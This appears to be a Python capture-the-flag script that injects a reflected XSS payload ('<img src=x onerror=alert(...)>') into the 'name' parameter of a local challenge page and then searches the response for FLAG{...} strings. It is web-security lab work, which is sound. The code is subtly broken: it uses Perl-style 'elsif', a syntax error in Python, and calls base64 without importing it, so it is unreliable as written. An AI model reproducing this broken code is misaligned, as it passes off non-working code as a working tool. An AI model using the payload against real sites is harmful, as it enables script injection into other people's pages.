import requests
import re
import urllib.parse

url = "http://127.0.0.1:33203/page"
payload = "<img src=x onerror=alert('XSS')>"

print(f"[+] Making targeted request with specific payload:")
print(f"    Payload: {payload}")

# URL encode the payload
encoded_payload = urllib.parse.quote(payload)
full_url = f"{url}?name={encoded_payload}"

print(f"    Full URL: {full_url}")
print(f"\n{'='*80}")

response = requests.get(full_url, allow_redirects=True)

print(f"[+] Response Analysis:")
print(f"    Status Code: {response.status_code}")
print(f"    Final URL: {response.url}")
print(f"    Redirects: {len(response.history)}")

if response.history:
    for i, resp in enumerate(response.history, 1):
        print(f"    Redirect {i}: {resp.status_code} -> {resp.headers.get('Location', 'N/A')}")

print(f"\n[+] Response Headers (All):")
for header, value in response.headers.items():
    print(f"    {header:25}: {value}")

# Look for flags in headers
print(f"\n[+] Checking headers for flag patterns...")
flag_in_headers = False
for header, value in response.headers.items():
    if 'FLAG{' in value:
        print(f"[!] FLAG FOUND in header '{header}': {value}")
        flag_in_headers = True

if not flag_in_headers:
    print("[-] No flags in headers")

print(f"\n[+] Response Body (Full - Raw):")
print(f"{'='*80}")
print(response.text)
print(f"{'='*80}")

# Comprehensive flag search
print(f"\n[+] Comprehensive Flag Search:")
content = response.text

# Direct pattern
flags = re.findall(r'FLAG\{[^}]+\}', content)
print(f"    Direct FLAG{{...}} patterns: {len(flags)}")
if flags:
    for flag in flags:
        print(f"    [!] FLAG: {flag}")

# Case insensitive
flags_ci = re.findall(r'flag\{[^}]+\}', content, re.IGNORECASE)
print(f"    Case-insensitive flag patterns: {len(flags_ci)}")
if flags_ci:
    for flag in flags_ci:
        print(f"    [!] Flag: {flag}")

# Look for hex strings (common in flags)
hex_strings = re.findall(r'[a-fA-F0-9]{32,64}', content)
if hex_strings:
    print(f"    Potential hex strings: {len(hex_strings)}")
    for i, hex_str in enumerate(hex_strings[:5], 1):
        print(f"      {i}. {hex_str}")

# Base64 encoded
b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
flag_found_b64 = False
for b64_str in b64_matches:
    try:
        decoded = base64.b64decode(b64_str + '=' * (-len(b64_str) % 4))
        decoded_str = decoded.decode('utf-8', errors='ignore')
        if 'FLAG{' in decoded_str.upper():
            print(f"    [!] Base64 encoded flag found:")
            print(f"        Encoded: {b64_str}")
            print(f"        Decoded: {decoded_str}")
            flag_found_b64 = True
    except:
        pass

# Check for commented out flags (HTML comments)
comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
if comments:
    print(f"    HTML comments found: {len(comments)}")
    for i, comment in enumerate(comments, 1):
        if 'FLAG{' in comment.upper():
            print(f"    [!] FLAG in comment #{i}: {comment.strip()}")
        elif len(comment.strip()) > 0:
            print(f"    Comment #{i}: {comment.strip()[:100]}")

# JavaScript strings
js_strings = re.findall(r'"([^"]{10,})"', content)
single_quotes = re.findall(r"'([^']{10,})'", content)
all_strings = js_strings + single_quotes

print(f"    JavaScript/string literals: {len(all_strings)}")
string_flags = [s for s in all_strings if 'FLAG{' in s.upper()]
if string_flags:
    for flag in string_flags:
        print(f"    [!] Flag in string: {flag}")

# Look for where the parameter appears
print(f"\n[+] Parameter Reflection Analysis:")
if payload in content:
    print(f"[!] Raw payload FOUND in response")
    
    matches = list(re.finditer(re.escape(payload), content))
    for i, match in enumerate(matches, 1):
        start = max(0, match.start() - 200)
        end = min(len(content), match.end() + 200)
        context = content[start:end]
        print(f"\n    Match #{i} at position {match.start()}-{match.end()}:")
        print(f"    Context: {context}")
elsif encoded_payload in content:
    print(f"[!] Encoded payload FOUND in response")
    
    matches = list(re.finditer(re.escape(encoded_payload), content))
    for i, match in enumerate(matches, 1):
        start = max(0, match.start() - 200)
        end = min(len(content), match.end() + 200)
        context = content[start:end]
        print(f"\n    Match #{i} at position {match.start()}-{match.end()}:")
        print(f"    Context: {context}")
else:
    print(f"[-] Payload not directly reflected")
    
    # Check for stripped version
    stripped_payload = payload.replace('<', '').replace('>', '').replace('"', '')
    if stripped_payload in content:
        print(f"[!] Payload without tags/symbols found: {stripped_payload}")
    
    # Or maybe only certain parts are blocked
    if "img src=x onerror=alert('XSS')" in content.replace('>', '').replace('<', ''):
        print(f"[!] Payload content (without brackets) found")

print(f"\n[+] Final Status:")
if flags or flags_ci or flag_found_b64 or string_flags:
    print(f"[!] FLAG(S) FOUND - see above")
else:
    print(f"[-] No FLAG{{...}} pattern found in response")
